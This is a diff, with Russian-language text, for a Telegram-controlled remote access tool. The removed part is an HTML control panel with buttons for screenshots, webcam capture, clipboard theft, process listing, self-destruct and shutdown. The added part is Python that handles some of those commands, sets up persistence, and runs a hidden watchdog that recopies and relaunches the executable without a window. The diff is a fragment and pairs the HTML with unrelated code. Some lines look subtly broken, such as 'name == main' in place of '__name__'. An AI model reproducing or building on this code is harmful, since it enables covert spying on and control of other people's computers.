@@ -1,43 +1,43 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0d1117; color: #c9d1d9; margin: 0; padding: 15px; }
-        .app { max-width: 400px; margin: 0 auto; background: #161b22; border: 1px solid #30363d; border-radius: 20px; padding: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); }
-        .status { font-size: 12px; color: #8b949e; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px; }
-        .dot { height: 8px; width: 8px; background: #238636; border-radius: 50%; box-shadow: 0 0 10px #238636; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .btn { background: #21262d; border: 1px solid #363b42; color: #c9d1d9; padding: 18px 5px; border-radius: 12px; font-weight: 600; cursor: pointer; transition: 0.2s; display: flex; flex-direction: column; align-items: center; gap: 8px; }
-        .btn:active { background: #30363d; transform: scale(0.96); }
-        .btn-danger { background: rgba(248, 81, 73, 0.1); border-color: #f85149; color: #f85149; grid-column: span 2; margin-top: 10px; }
-        .btn-warn { background: rgba(210, 153, 34, 0.1); border-color: #d29922; color: #d29922; grid-column: span 2; }
-    </style>
-</head>
-<body>
-    <div class="app">
-        <h3 style="text-align:center; margin-top:0;">🛰 Control Center</h3>
-        <div class="status"><div class="dot"></div> Соединение защищено</div>
-        
-        <div class="grid">
-            <button class="btn" onclick="send('screen')">📸 <span>Скриншот</span></button>
-            <button class="btn" onclick="send('webcam')">👁 <span>Камера</span></button>
-            <button class="btn" onclick="send('clip')">📋 <span>Буфер</span></button>
-            <button class="btn" onclick="send('tasks')">📊 <span>Процессы</span></button>
-            <button class="btn" onclick="send('info')">⚙️ <span>Система</span></button>
-            <button class="btn" onclick="send('vol_up')">🔊 <span>Звук +5%</span></button>
-            
-            <button class="btn btn-warn" onclick="if(confirm('Удалить программу с ПК навсегда?')) send('destruct')">☣️ САМОЛИКВИДАЦИЯ</button>
-            <button class="btn btn-danger" onclick="if(confirm('Выключить ПК?')) send('off')">🛑 ВЫКЛЮЧИТЬ ПК</button>
-        </div>
-    </div>
+elif cmd == "info":
+        mem = psutil.virtual_memory()
+        await message.answer(f"⚙️ RAM: {mem.percent}% | User: {os.getlogin()}")
 
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script>
-        let tg = window.Telegram.WebApp;
-        tg.expand();
-        function send(cmd) { tg.sendData(cmd); tg.close(); }
-    </script>
-</body>
-</html>
+    elif cmd == "destruct":
+        await message.answer("☣️ Самоликвидация запущена...")
+        await self_destruct()
+
+    elif cmd == "off":
+        await message.answer("🛑 Выключаю ПК...")
+        os.system("shutdown /s /t 10")
+
+# --- ГЛАВНЫЙ ЗАПУСК ---
+
+async def main():
+    setup_persistence()
+    try: await bot.send_message(ADMIN_ID, "✅ Соединение с ПК установлено.")
+    except: pass
+    await dp.start_polling(bot)
+
+if name == 'main':
+    # 1. Режим СТОРОЖА
+    if "--watchdog" in sys.argv:
+        target_path = sys.argv[2]
+        while True:
+            time.sleep(15)
+            # Проверка основного файла по имени процесса
+            is_main_running = any(p.info['name'] == EXE_NAME for p in psutil.process_iter(['name']))
+            if not is_main_running:
+                if not os.path.exists(target_path):
+                    shutil.copy2(sys.executable, target_path)
+                subprocess.Popen([target_path], creationflags=subprocess.CREATE_NO_WINDOW)
+                sys.exit() # Сторож завершается, так как новая копия запустит своего сторожа
+    
+    # 2. Режим БОТА
+    else:
+        # Запускаем сторожа, если он еще не запущен
+        watchdog_running = any(p.info['name'] == HIDDEN_EXE_NAME for p in psutil.process_iter(['name']))
+        if not watchdog_running:
+            current_exe = sys.executable if getattr(sys, 'frozen', False) else file
+            subprocess.Popen([HIDDEN_PATH, "--watchdog", current_exe], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        asyncio.run(main())
